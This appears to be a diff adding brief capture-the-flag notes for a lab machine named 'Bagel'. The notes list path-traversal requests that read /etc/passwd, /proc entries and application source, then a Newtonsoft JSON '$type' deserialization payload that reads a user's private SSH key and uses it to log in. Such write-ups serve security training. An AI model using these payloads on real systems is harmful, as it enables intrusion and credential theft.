@@ -1,0 +1,32 @@
+Bagel:
+
+Burpsuite
+
+GET /?page=../../../../../../etc/passwd
+
+GET /?page=../../../../../../self/proc/environ
+
+PID:890
+
+GET /?page=../../../../../../../../../../../../proc/890/cmdline
+
+python3 /home/developer/app/app.py
+
+GET /?page=../../../../../../../../../../../../home/developer/app/app.py
+
+https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm
+
+"$type": "NameSpace.TypeName, AssemblyName" ,"ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}
+
+order =  { "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}
+
+python3 original.py
+
+read ssh keys and ssh -i id_rsa login
+
+
+
+
+
+
+
